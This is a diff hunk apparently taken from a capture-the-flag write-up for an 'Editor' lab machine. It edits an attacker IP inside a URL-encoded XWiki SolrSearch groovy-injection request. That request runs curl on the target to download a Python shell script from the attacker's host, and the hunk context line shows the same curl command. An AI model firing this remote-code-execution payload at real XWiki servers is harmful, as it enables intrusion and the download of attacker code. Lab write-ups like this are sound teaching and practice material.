@@ -168,7 +168,7 @@ curl http://$tun0:8080/pyshell.py -o /tmp/pyshell.py
 
 Full payload looked like this in URL encoded form + the endpoint and groovy script tags.
 ```http
-http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22curl%20http%3A%2F%2F10%2E10%2E16%2E15%3A8080%2Fpyshell%2Epy%20%2Do%20%2Ftmp%2Fpyshell%2Epy%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22curl%20http%3A%2F%2F10%2E10%2E16%2E62%3A8080%2Fpyshell%2Epy%20%2Do%20%2Ftmp%2Fpyshell%2Epy%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
 ```
 
 After that i ran
